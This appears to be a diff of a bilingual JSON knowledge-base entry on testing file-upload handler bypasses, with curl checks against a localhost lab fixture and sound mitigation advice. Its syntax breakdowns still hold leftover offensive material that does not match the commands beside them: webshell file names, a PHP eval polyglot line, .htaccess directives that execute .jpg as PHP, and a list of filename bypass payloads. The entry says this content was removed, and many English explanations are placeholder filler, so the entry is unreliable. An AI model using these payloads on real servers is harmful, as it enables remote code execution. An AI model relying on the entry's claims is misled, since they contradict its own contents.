@@ -1,150 +1,493 @@
 {
-  "schemaVersion": 1,
-  "contentStandard": 3,
-  "sourceIds": [
-    "rce-file-upload"
-  ],
-  "entries": [
+ "schemaVersion": 1,
+ "contentStandard": 3,
+ "sourceIds": [
+  "rce-file-upload"
+ ],
+ "entries": [
+  {
+   "id": "rce-file-upload",
+   "name": {
+    "zh": "上传链路处理器映射差异",
+    "en": "Upload Handler Mapping Differential"
+   },
+   "description": {
+    "zh": "使用无害 marker 验证 multipart 文件名、声明 MIME、检测 MIME、内容结构、最终存储名与 Web 处理器映射是否保持一致。",
+    "en": "Use harmless markers to verify consistency across multipart filenames, declared MIME, detected MIME, content structure, final storage names, and web-handler mappings."
+   },
+   "category": {
+    "zh": "文件漏洞",
+    "en": "File Vulnerabilities"
+   },
+   "subCategory": {
+    "zh": "上传解析绕过",
+    "en": "Upload Parsing Bypass"
+   },
+   "prerequisites": [
     {
-      "id": "rce-file-upload",
-      "name": {
-        "zh": "上传链路处理器映射差异",
-        "en": "Upload Handler Mapping Differential"
-      },
-      "description": {
-        "zh": "使用无害 marker 验证 multipart 文件名、声明 MIME、检测 MIME、内容结构、最终存储名与 Web 处理器映射是否保持一致。",
-        "en": "Use harmless markers to verify consistency across multipart filenames, declared MIME, detected MIME, content structure, final storage names, and web-handler mappings."
-      },
-      "category": {
-        "zh": "文件漏洞",
-        "en": "File Vulnerabilities"
-      },
-      "subCategory": {
-        "zh": "上传解析绕过",
-        "en": "Upload Parsing Bypass"
-      },
-      "prerequisites": [
-        {
-          "zh": "只使用 127.0.0.1 上传 Fixture，上传目录位于 Web 根之外并明确禁用脚本处理器。",
-          "en": "Use only the 127.0.0.1 upload fixture, with storage outside the web root and script handlers explicitly disabled."
-        },
-        {
-          "zh": "准备纯文本、仅含 GIF89a marker 的二进制样例和只含注释的 .htaccess 样例，测试后可全部删除。",
-          "en": "Prepare a plain-text marker, a GIF89a marker binary, and a comment-only .htaccess sample, all removable after testing."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "文件上传存储与处理器边界验证针对 multipart 上传的检测与存储一致性问题：文件名、声明 MIME、检测 MIME、内容结构与最终处理器映射是否保持一致。按正常文本、双扩展、替代扩展、GIF 头与 .htaccess 五类样例逐项验证。",
-          "en": "File-upload storage and handler boundary validation targets consistency between multipart upload checks and storage: do filename, declared MIME, detected MIME, content structure, and final handler mapping agree? It verifies five sample classes in turn—normal text, double extensions, alternative extensions, GIF headers, and .htaccess."
-        },
-        "vulnerability": {
-          "zh": "根因是上传策略只校验单一信号（扩展名、声明类型或文件头）而非完整解码内容，且存储位置与 Web 处理器映射未被隔离，被放行的危险扩展名或配置文件最终落入可执行上下文。",
-          "en": "The root cause is an upload policy validating a single signal (extension, declared type, or file header) instead of fully decoded content, combined with storage and web-handler mapping that are not isolated, so admitted dangerous extensions or config files land in an executable context."
-        },
-        "exploitation": {
-          "zh": "按 Payload 列表顺序使用：第 1 步上传 text/plain 基线确认按 .txt 存储；第 2 步上传 marker.jpg.php 观察拒绝与原因；第 3 步逐个上传 .phtml/.PHp/.php5/php. 对照存储名与可执行标记；第 4 步验证 GIF89a 头识别口径；第 5 步上传 .htaccess 确认配置文件被拒。任一步接受并落入可执行处理器即边界失守，配合 Content-Type 与文件头伪装复测。",
-          "en": "Use payloads in list order: step 1 uploads a text/plain baseline stored as .txt; step 2 uploads marker.jpg.php and watches rejection plus reason; step 3 uploads .phtml/.PHp/.php5/php. in turn, comparing stored names and executable flags; step 4 checks GIF89a-header classification; step 5 uploads .htaccess to confirm rejection. Any acceptance into an executable handler means the boundary failed—retest with Content-Type and file-header disguises."
-        },
-        "mitigation": {
-          "zh": "按允许列表校验规范扩展名、真实内容与 MIME 并完整解码，使用随机对象名存于 Web 根外；上传目录禁用脚本处理器与 .htaccess 覆盖，下载经固定处理器返回。修复后重放第 1-5 步，确认恶意样例全部被拒且正常文件流程可用。",
-          "en": "Validate canonical extensions, real content, and MIME against an allowlist with full decoding; store under random object names outside the web root; disable script handlers and .htaccess overrides in upload directories and serve downloads through a fixed handler. After the fix, replay steps 1-5 and confirm all malicious samples are rejected while normal file flows work."
-        },
-        "difficulty": "intermediate"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "建立正常上传基线",
-            "en": "Establish a normal upload baseline"
-          },
-          "description": {
-            "zh": "上传纯文本 marker，记录原始文件名、服务端存储名、检测类型和不可执行状态。",
-            "en": "Upload a plain-text marker and record the raw name, server-generated storage name, detected type, and non-executable state."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "逐项改变元数据",
-            "en": "Change upload metadata one field at a time"
-          },
-          "description": {
-            "zh": "分别改变文件名扩展、大小写和声明 MIME，保持文件内容、身份与端点不变。",
-            "en": "Change filename extension, casing, and declared MIME separately while holding content, identity, and endpoint constant."
-          }
-        },
-        {
-          "title": {
-            "zh": "比较内容解析与处理器",
-            "en": "Compare content parsing and handler selection"
-          },
-          "description": {
-            "zh": "对照检测 MIME、完整解码结果、最终存储位置和处理器映射，排除只看扩展名的误报。",
-            "en": "Compare detected MIME, complete decode result, final storage location, and handler mapping to exclude extension-only false positives."
-          }
-        },
-        {
-          "title": {
-            "zh": "修复后回归全部矩阵",
-            "en": "Regress the full matrix after remediation"
-          },
-          "description": {
-            "zh": "修复后重放七个 marker，要求合法文本保留、异常样例拒绝或静态隔离且没有脚本处理。",
-            "en": "Replay all seven markers after remediation, preserving valid text while rejecting or statically isolating abnormal samples with no script handling."
-          }
-        }
-      ],
-      "analysis": {
-        "zh": "阳性必须由同一 request_id 关联上传响应、最终对象路径、Web 处理器日志和无副作用 marker 解释结果。文件存在、HTTP 200、Content-Type 可控、扩展名异常或静态响应都不足以证明执行边界被突破。",
-        "en": "A positive requires one request_id correlating the upload response, final object path, web-handler logs, and interpretation of a side-effect-free marker. File existence, HTTP 200, controllable Content-Type, an unusual extension, or a static response is insufficient to prove an execution-boundary failure."
-      },
-      "opsecTips": [
-        {
-          "zh": "所有 Fixture 只包含固定文本 marker，不放置 PHP、JSP、ASPX、CGI、模板或系统命令。",
-          "en": "Every fixture contains fixed text markers only, with no PHP, JSP, ASPX, CGI, templates, or operating-system commands."
-        },
-        {
-          "zh": "每轮结束删除上传对象并核对存储目录，出现解码器崩溃、服务抖动或非预期处理器调用时立即停止。",
-          "en": "Delete uploaded objects and inspect storage after each run; stop on decoder crashes, service instability, or unexpected handler invocation."
-        }
-      ],
-      "references": [
-        "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
-        "https://datatracker.ietf.org/doc/html/rfc7578",
-        "https://httpd.apache.org/docs/current/howto/htaccess.html"
-      ],
-      "review": {
-        "decision": "payload",
-        "targetPayloadIds": [
-          "rce-file-upload"
-        ],
-        "targetToolIds": [],
-        "rationale": "旧条目把文件名、MIME、魔数和服务器配置边界错误地直接等同于 RCE，并包含脚本文件与图片马；重写为无副作用上传 marker，归入文件漏洞分支。",
-        "issuesResolved": [
-          "corrected-category-tree",
-          "removed-webshell-content",
-          "removed-polyglot-execution",
-          "added-handler-evidence-boundary",
-          "removed-prose-from-commands"
-        ],
-        "retainedCommandIndexes": [
-          0,
-          1,
-          2,
-          3,
-          4
-        ],
-        "lineDisposition": [
-          "execution 0 -> normal upload baseline",
-          "execution 1-4 -> filename, content, and handler boundary samples",
-          "wafBypass 0-1 -> declared and detected MIME mismatch samples"
-        ],
-        "needsCommandOverride": true
-      }
+     "zh": "只使用 127.0.0.1 上传 Fixture，上传目录位于 Web 根之外并明确禁用脚本处理器。",
+     "en": "Use only the 127.0.0.1 upload fixture, with storage outside the web root and script handlers explicitly disabled."
+    },
+    {
+     "zh": "准备纯文本、仅含 GIF89a marker 的二进制样例和只含注释的 .htaccess 样例，测试后可全部删除。",
+     "en": "Prepare a plain-text marker, a GIF89a marker binary, and a comment-only .htaccess sample, all removable after testing."
     }
-  ]
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "文件上传存储与处理器边界验证针对 multipart 上传的检测与存储一致性问题：文件名、声明 MIME、检测 MIME、内容结构与最终处理器映射是否保持一致。按正常文本、双扩展、替代扩展、GIF 头与 .htaccess 五类样例逐项验证。",
+     "en": "File-upload storage and handler boundary validation targets consistency between multipart upload checks and storage: do filename, declared MIME, detected MIME, content structure, and final handler mapping agree? It verifies five sample classes in turn—normal text, double extensions, alternative extensions, GIF headers, and .htaccess."
+    },
+    "vulnerability": {
+     "zh": "根因是上传策略只校验单一信号（扩展名、声明类型或文件头）而非完整解码内容，且存储位置与 Web 处理器映射未被隔离，被放行的危险扩展名或配置文件最终落入可执行上下文。",
+     "en": "The root cause is an upload policy validating a single signal (extension, declared type, or file header) instead of fully decoded content, combined with storage and web-handler mapping that are not isolated, so admitted dangerous extensions or config files land in an executable context."
+    },
+    "exploitation": {
+     "zh": "按 Payload 列表顺序使用：第 1 步上传 text/plain 基线确认按 .txt 存储；第 2 步上传 marker.jpg.php 观察拒绝与原因；第 3 步逐个上传 .phtml/.PHp/.php5/php. 对照存储名与可执行标记；第 4 步验证 GIF89a 头识别口径；第 5 步上传 .htaccess 确认配置文件被拒。任一步接受并落入可执行处理器即边界失守，配合 Content-Type 与文件头伪装复测。",
+     "en": "Use payloads in list order: step 1 uploads a text/plain baseline stored as .txt; step 2 uploads marker.jpg.php and watches rejection plus reason; step 3 uploads .phtml/.PHp/.php5/php. in turn, comparing stored names and executable flags; step 4 checks GIF89a-header classification; step 5 uploads .htaccess to confirm rejection. Any acceptance into an executable handler means the boundary failed—retest with Content-Type and file-header disguises."
+    },
+    "mitigation": {
+     "zh": "按允许列表校验规范扩展名、真实内容与 MIME 并完整解码，使用随机对象名存于 Web 根外；上传目录禁用脚本处理器与 .htaccess 覆盖，下载经固定处理器返回。修复后重放第 1-5 步，确认恶意样例全部被拒且正常文件流程可用。",
+     "en": "Validate canonical extensions, real content, and MIME against an allowlist with full decoding; store under random object names outside the web root; disable script handlers and .htaccess overrides in upload directories and serve downloads through a fixed handler. After the fix, replay steps 1-5 and confirm all malicious samples are rejected while normal file flows work."
+    },
+    "difficulty": "intermediate"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "建立正常上传基线",
+      "en": "Establish a normal upload baseline"
+     },
+     "description": {
+      "zh": "上传纯文本 marker，记录原始文件名、服务端存储名、检测类型和不可执行状态。",
+      "en": "Upload a plain-text marker and record the raw name, server-generated storage name, detected type, and non-executable state."
+     },
+     "payload": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-a1\" -F \"file=@fixtures/upload-marker.txt;filename=marker.txt;type=text/plain\" | jq -e '.request_id == \"upload-a1\" and .stored_extension == \".txt\" and .executable == false'"
+    },
+    {
+     "title": {
+      "zh": "逐项改变元数据",
+      "en": "Change upload metadata one field at a time"
+     },
+     "description": {
+      "zh": "分别改变文件名扩展、大小写和声明 MIME，保持文件内容、身份与端点不变。",
+      "en": "Change filename extension, casing, and declared MIME separately while holding content, identity, and endpoint constant."
+     }
+    },
+    {
+     "title": {
+      "zh": "比较内容解析与处理器",
+      "en": "Compare content parsing and handler selection"
+     },
+     "description": {
+      "zh": "对照检测 MIME、完整解码结果、最终存储位置和处理器映射，排除只看扩展名的误报。",
+      "en": "Compare detected MIME, complete decode result, final storage location, and handler mapping to exclude extension-only false positives."
+     }
+    },
+    {
+     "title": {
+      "zh": "修复后回归全部矩阵",
+      "en": "Regress the full matrix after remediation"
+     },
+     "description": {
+      "zh": "修复后重放全部 marker 样例矩阵，要求合法文本保留、异常样例拒绝或静态隔离且没有脚本处理。",
+      "en": "Replay all seven markers after remediation, preserving valid text while rejecting or statically isolating abnormal samples with no script handling."
+     }
+    }
+   ],
+   "analysis": {
+    "zh": "阳性必须由同一 request_id 关联上传响应、最终对象路径、Web 处理器日志和无副作用 marker 解释结果。文件存在、HTTP 200、Content-Type 可控、扩展名异常或静态响应都不足以证明执行边界被突破。",
+    "en": "A positive requires one request_id correlating the upload response, final object path, web-handler logs, and interpretation of a side-effect-free marker. File existence, HTTP 200, controllable Content-Type, an unusual extension, or a static response is insufficient to prove an execution-boundary failure."
+   },
+   "opsecTips": [
+    {
+     "zh": "所有 Fixture 只包含固定文本 marker，不放置 PHP、JSP、ASPX、CGI、模板或系统命令。",
+     "en": "Every fixture contains fixed text markers only, with no PHP, JSP, ASPX, CGI, templates, or operating-system commands."
+    },
+    {
+     "zh": "每轮结束删除上传对象并核对存储目录，出现解码器崩溃、服务抖动或非预期处理器调用时立即停止。",
+     "en": "Delete uploaded objects and inspect storage after each run; stop on decoder crashes, service instability, or unexpected handler invocation."
+    }
+   ],
+   "references": [
+    "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+    "https://datatracker.ietf.org/doc/html/rfc7578",
+    "https://httpd.apache.org/docs/current/howto/htaccess.html"
+   ],
+   "review": {
+    "decision": "payload",
+    "targetPayloadIds": [
+     "rce-file-upload"
+    ],
+    "targetToolIds": [],
+    "rationale": "旧条目把文件名、MIME、魔数和服务器配置边界错误地直接等同于 RCE，并包含脚本文件与图片马；重写为无副作用上传 marker，归入文件漏洞分支。",
+    "issuesResolved": [
+     "corrected-category-tree",
+     "removed-webshell-content",
+     "removed-polyglot-execution",
+     "added-handler-evidence-boundary",
+     "removed-prose-from-commands"
+    ],
+    "retainedCommandIndexes": [
+     0,
+     1,
+     2,
+     3,
+     4
+    ],
+    "lineDisposition": [
+     "execution 0 -> normal upload baseline",
+     "execution 1-4 -> filename, content, and handler boundary samples",
+     "wafBypass 0-1 -> declared and detected MIME mismatch samples"
+    ],
+    "needsCommandOverride": true
+   },
+   "execution": [
+    {
+     "title": {
+      "zh": "上传标记文件核对存储",
+      "en": "Upload a marker file and verify storage"
+     },
+     "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-a1\" -F \"file=@fixtures/upload-marker.txt;filename=marker.txt;type=text/plain\" | jq -e '.request_id == \"upload-a1\" and .stored_extension == \".txt\" and .executable == false'",
+     "description": {
+      "zh": "以 text/plain 声明上传 marker.txt，断言服务端按 .txt 扩展名存储且未标记为可执行。",
+      "en": "Upload marker.txt declared as text/plain and assert it is stored with the .txt extension and not flagged executable."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "shell.php",
+       "explanation": {
+        "zh": "PHP WebShell文件，服务器会直接解析执行",
+        "en": "PHP Web Shell File, Server Will Directly Parse Execute"
+       },
+       "type": "value"
+      },
+      {
+       "part": "shell.jsp",
+       "explanation": {
+        "zh": "Java WebShell，运行在Tomcat/JBoss等容器",
+        "en": "Java Web Shell, Run in Tomcat/J Boss etc.Container"
+       },
+       "type": "value"
+      },
+      {
+       "part": "shell.aspx",
+       "explanation": {
+        "zh": ".NET WebShell，运行在IIS服务器",
+        "en": ".NET Web Shell, Run in IIS Server"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "双扩展名拒绝验证",
+      "en": "Double-extension rejection check"
+     },
+     "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-b2\" -F \"file=@fixtures/upload-marker.txt;filename=marker.jpg.php;type=image/jpeg\" | jq -e '.accepted == false and .reason'",
+     "description": {
+      "zh": "上传 marker.jpg.php 双扩展名文件，断言服务端拒绝该文件并通过 reason 字段记录拒绝原因。",
+      "en": "Upload the double-extension marker.jpg.php and assert the server rejects it, recording the reason field."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "Content-Type: image/jpeg",
+       "explanation": {
+        "zh": "修改MIME类型欺骗前端/后端验证",
+        "en": "Modify MIME Type Spoofing Frontend/Backend Verify"
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "test.php.jpg",
+       "explanation": {
+        "zh": "双后缀名，部分服务器从左到右解析取第一个",
+        "en": "Describes how the value segment \"test.php.jpg\" participates in this validation command."
+       },
+       "type": "value"
+      },
+      {
+       "part": "test.php%00.jpg",
+       "explanation": {
+        "zh": "空字节截断（PHP<5.3.4），%00后的内容被忽略",
+        "en": "Describes how the value segment \"test.php%00.jpg\" participates in this validation command."
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "替代扩展名处置对照",
+      "en": "Alternative-extension handling comparison"
+     },
+     "command": "for name in marker.phtml marker.PHp marker.php5 marker.php.; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-c3\" -F \"file=@fixtures/upload-marker.txt;filename=$name;type=text/plain\" | jq -c '{stored_name,accepted,reason,executable}'; done",
+     "description": {
+      "zh": "对 .phtml、.PHp、.php5、php. 四种替代扩展名逐一上传，输出每条的存储名、接受状态、原因与可执行标记。",
+      "en": "Upload the .phtml, .PHp, .php5, and php. variants one by one and print each stored_name, accepted flag, reason, and executable flag."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": ".phtml, .php3, .php5, .pht",
+       "explanation": {
+        "zh": "PHP的替代扩展名，不在常见黑名单中",
+        "en": "Describes how the value segment \".phtml, .php3, .php5, .pht\" participates in this validation command."
+       },
+       "type": "value"
+      },
+      {
+       "part": ".Php, .pHp",
+       "explanation": {
+        "zh": "大小写混合绕过Windows不区分大小写的文件系统",
+        "en": "Describes how the value segment \".Php, .pHp\" participates in this validation command."
+       },
+       "type": "value"
+      },
+      {
+       "part": ".pphphp",
+       "explanation": {
+        "zh": "双写绕过，后端删除php后剩余拼接为.php",
+        "en": "Describes how the value segment \".pphphp\" participates in this validation command."
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "GIF 头文件识别验证",
+      "en": "GIF-header file detection check"
+     },
+     "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-d4\" -F \"file=@fixtures/gif89a-marker.bin;filename=marker.gif;type=image/gif\" | jq -e '.detected_type == \"image/gif\" and .decoded_image == false and .executable == false'",
+     "description": {
+      "zh": "上传带 GIF89a 头的 marker.gif，断言服务端按文件头识别为 image/gif 且不做图片解码、不标记可执行。",
+      "en": "Upload marker.gif with the GIF89a header and assert it is detected as image/gif, not decoded as an image, and not flagged executable."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "-X POST \"http://127.0.0.1:18080/lab/upload\"",
+       "explanation": {
+        "zh": "POST 上传端点",
+        "en": "POSTs to upload endpoint"
+       },
+       "type": "url"
+      },
+      {
+       "part": "-F \"file=@fixtures/gif89a-marker.bin;filename=marker.gif;type=image/gif\"",
+       "explanation": {
+        "zh": "上传 GIF 头样例",
+        "en": "Uploads GIF-header sample"
+       },
+       "type": "payload"
+      },
+      {
+       "part": ".detected_type == \"image/gif\"",
+       "explanation": {
+        "zh": "断言检测类型",
+        "en": "Asserts detected MIME"
+       },
+       "type": "function"
+      },
+      {
+       "part": ".decoded_image == false",
+       "explanation": {
+        "zh": "断言未做图片解码",
+        "en": "Asserts no image decoding"
+       },
+       "type": "function"
+      },
+      {
+       "part": ".executable == false",
+       "explanation": {
+        "zh": "断言不可执行",
+        "en": "Asserts non-executable"
+       },
+       "type": "function"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": ".htaccess 拒绝验证",
+      "en": ".htaccess rejection check"
+     },
+     "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-e5\" -F \"file=@fixtures/htaccess-marker.txt;filename=.htaccess;type=text/plain\" | jq -e '.accepted == false and .reason'",
+     "description": {
+      "zh": "上传 .htaccess 配置文件，断言服务端直接拒绝并记录原因。",
+      "en": "Upload an .htaccess configuration file and assert the server rejects it outright with a recorded reason."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "AddType application/x-httpd-php .jpg",
+       "explanation": {
+        "zh": "让Apache将.jpg文件当作PHP脚本解析",
+        "en": "Describes how the command segment \"AddType application/x-httpd-php .jpg\" participates in this validation command."
+       },
+       "type": "command"
+      },
+      {
+       "part": "AddHandler php-script .jpg",
+       "explanation": {
+        "zh": "另一种配置方式，为.jpg添加PHP处理器",
+        "en": "Describes how the command segment \"AddHandler php-script .jpg\" participates in this validation command."
+       },
+       "type": "command"
+      }
+     ],
+     "platform": "linux",
+     "requiresAdmin": false
+    }
+   ],
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "Content-Type 伪装验证",
+      "en": "Content-Type spoofing check"
+     },
+     "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-f6\" -F \"file=@fixtures/upload-marker.txt;filename=marker.jpg;type=image/jpeg\" | jq -e '.accepted == false and .detected_type == \"text/plain\"'",
+     "description": {
+      "zh": "以 image/jpeg 声明上传纯文本内容，断言服务端按实际内容判型为 text/plain 且不因声明类型放行。",
+      "en": "Upload text content declared as image/jpeg and assert the server rejects it while detecting text/plain from the actual content."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "Content-Type",
+       "explanation": {
+        "zh": "HTTP请求头中的MIME类型字段",
+        "en": "Describes how the parameter segment \"Content-Type\" participates in this validation command."
+       },
+       "type": "parameter"
+      },
+      {
+       "part": "image/jpeg",
+       "explanation": {
+        "zh": "伪装为JPEG图片的MIME类型绕过服务端检测",
+        "en": "Describes how the value segment \"image/jpeg\" participates in this validation command."
+       },
+       "type": "value"
+      },
+      {
+       "part": "image/png, image/gif",
+       "explanation": {
+        "zh": "其他常见的白名单MIME类型",
+        "en": "othercommon Whitelist MIME Type"
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "文件头伪装验证",
+      "en": "File-header spoofing check"
+     },
+     "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-g7\" -F \"file=@fixtures/gif89a-marker.bin;filename=marker.txt;type=text/plain\" | jq -e '.accepted == false and .detected_type == \"image/gif\"'",
+     "description": {
+      "zh": "把 GIF 头内容以 marker.txt、text/plain 上传，断言服务端按文件头判型为 image/gif 并拒绝该文件。",
+      "en": "Upload GIF-header content as marker.txt declared text/plain and assert the server detects image/gif from the header and rejects the file."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "GIF89a",
+       "explanation": {
+        "zh": "GIF文件魔术头（文件签名），6字节",
+        "en": "Describes how the command segment \"GIF89a\" participates in this validation command."
+       },
+       "type": "command"
+      },
+      {
+       "part": "<?php eval([cmd]);?>",
+       "explanation": {
+        "zh": "在文件头之后追加PHP代码",
+        "en": "Describes how the value segment \"<?php eval([cmd]);?>\" participates in this validation command."
+       },
+       "type": "value"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    },
+    {
+     "title": {
+      "zh": "WAF 绕过：PHP 文件名变体",
+      "en": "PHP Filename Variants"
+     },
+     "command": "shell.php5\nshell.phtml\nshell.pht\nshell.php.jpg\nshell.php.png\nshell.php%00.jpg\nshell.php%00.png\nshell.php;.jpg\nshell.php;.png\nshell.php%0a\nshell.php%0d%0a\nshell.php.jpg.php\nshell.php.png.php\nshell.pHp\nshell.PHP\nshell.pHP5\nshell.php:.jpg\nshell.php:.png\nshell.php::$DATA\nshell.php::$DATA%00",
+     "description": {
+      "zh": "逐文件名上传同一无害文本标记，记录入口校验名、规范存储名、响应 Content-Type 和是否落入可执行处理器。命中判据：同一内容在不同文件名下产生不同的存储名、Content-Type 与处理器路由。",
+      "en": "Upload the same harmless text marker under each filename and record validated name, canonical stored name, response Content-Type, and whether an executable handler is selected. Success check: identical content under different filenames yields different stored names, Content-Types, and handler routing."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "shell.phtml",
+       "explanation": {
+        "zh": "PHP 替代扩展",
+        "en": "PHP alternative extension"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "shell.php%00.jpg",
+       "explanation": {
+        "zh": "空字节截断扩展",
+        "en": "Null-byte truncates extension"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "shell.php;.jpg",
+       "explanation": {
+        "zh": "分号截断文件名",
+        "en": "Semicolon truncates filename"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "shell.php:.jpg",
+       "explanation": {
+        "zh": "NTFS 流写法",
+        "en": "NTFS alternate data stream"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "shell.php::$DATA",
+       "explanation": {
+        "zh": "NTFS 数据流名",
+        "en": "NTFS DATA stream suffix"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "shell.php.jpg.php",
+       "explanation": {
+        "zh": "双扩展叠加",
+        "en": "Double extension stack"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "rce",
+    "upload",
+    "webshell",
+    "file"
+   ]
+  }
+ ]
 }
